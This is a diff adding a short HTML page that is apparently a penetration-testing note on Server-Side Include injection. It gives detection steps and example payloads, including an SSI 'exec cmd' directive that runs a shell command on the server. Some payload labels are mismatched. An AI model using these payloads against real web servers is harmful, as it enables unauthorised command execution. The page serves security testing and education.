@@ -1,0 +1,30 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>SSI Injection</title>
+</head><body><b><span style="font-size: 14pt">Server-Side Includes<br/>
+<br/>
+</span><span style="font-size: 12pt"><br/>
+</span><span style="font-size: 12pt">DETECTION</span><span style="font-size: 14pt"><br/>
+</span></b><br/>
+Detect webserver and check in manual if SSI enabled by default<br/>
+If it contains <tt>.shtml</tt>files, then SSI are probably supported<br/>
+<br/>
+Test if characters needed by SSI can be injected<br/>
+&lt; ! # = / . “ - &gt; and [a-zA-Z0-9]<br/>
+<br/>
+<br/>
+<b><span style="font-size: 12pt">EXPLOITATION</span></b><span style="font-size: 10pt"><br/>
+</span><span style="font-size: 10pt"><br/>
+</span><b>Print out the current time<br/>
+</b><tt><br/>
+</tt><tt>&lt;!--#echo var=&quot;DATE_LOCAL&quot; --&gt;</tt><b><br/>
+</b><b><br/>
+</b><b>Include the output of a CGI script</b><br/>
+<tt><br/>
+&lt;!--#include virtual=&quot;/footer.html&quot; --&gt;<br/>
+<br/>
+</tt><b>To include the content of a file or list files in a directory</b><br/>
+<tt><br/>
+&lt;!--#exec cmd=&quot;ls&quot; --&gt;<br/>
+</tt></body></html>
